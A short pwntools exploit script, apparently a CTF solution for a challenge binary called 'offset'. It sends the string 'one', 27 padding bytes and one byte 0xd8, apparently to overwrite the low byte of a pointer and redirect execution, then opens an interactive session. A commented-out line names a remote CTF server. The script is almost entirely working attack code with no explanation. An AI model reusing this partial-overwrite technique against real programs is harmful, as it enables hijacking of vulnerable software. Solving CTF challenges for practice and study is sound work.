from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./offset")
p = process("./offset")
#r = remote("ctf.j0n9hyun.xyz", 3007)
print p.recvuntil("call?\n")

payload = ''
payload += "one"
payload += "A"*27
payload += "\xd8"

p.sendline(payload)
p.interactive()
